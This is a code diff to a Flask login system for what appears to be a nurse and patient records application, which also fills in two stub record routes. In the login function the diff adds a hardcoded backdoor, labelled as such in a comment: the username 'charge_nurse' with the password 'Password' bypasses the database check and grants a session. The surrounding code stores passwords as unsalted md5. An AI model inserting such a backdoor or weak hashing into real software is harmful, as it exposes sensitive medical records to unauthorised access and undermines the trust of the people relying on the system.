@@ -41,7 +41,6 @@ def register_user():
         last_name = request.form['last_name']
         password = request.form['password']
         password_conf = request.form['password_conf']
-
         if password == password_conf:
             cursor.execute(
                 'INSERT INTO users (username, password, first_name, last_name) '
@@ -65,18 +64,26 @@ def login_user():
         username = request.form['username']
         password = request.form['password']
 
-        cursor.execute(
-            'SELECT * FROM users WHERE username = %s AND password = md5(%s)', (
-                username, password,)
-        )
-        account = cursor.fetchone()
-        if account:
+        # Backdoor sign in with charge_nurse
+        if username == "charge_nurse" and password == "Password":
             session['loggedin'] = True
-            session['id'] = account[0]
+            session['id'] = "charge_nurse"
             session['username'] = username
             return render_template("mainPage.html", loggedin=session['loggedin'])
+
         else:
-            return render_template("login.html", msg="Invalid Login")
+            cursor.execute(
+                'SELECT * FROM users WHERE username = %s AND password = md5(%s)', (
+                    username, password,)
+            )
+            account = cursor.fetchone()
+            if account:
+                session['loggedin'] = True
+                session['id'] = account[0]
+                session['username'] = username
+                return render_template("mainPage.html", loggedin=session['loggedin'])
+            else:
+                return render_template("login.html", msg="Invalid Login")
 
 
 @app.route('/logout')
@@ -89,7 +96,7 @@ def logout():
 
 @app.route("/nurseRecords", methods=["GET"])
 def nurse_records():
-    return
+    return render_template("./Records/nurseRecord.html", loggedin=session['loggedin'])
 
 
 @app.route("/nurseRecordsSubmit", methods=['POST'])
@@ -99,7 +106,7 @@ def nurse_records_submit():
 
 @app.route("/patientRecords", methods=["GET"])
 def patient_records():
-    return
+    return render_template("./Records/patientRecord.html", loggedin=session['loggedin'])
 
 
 @app.route("/patientRecordsSubmit", methods=['POST'])
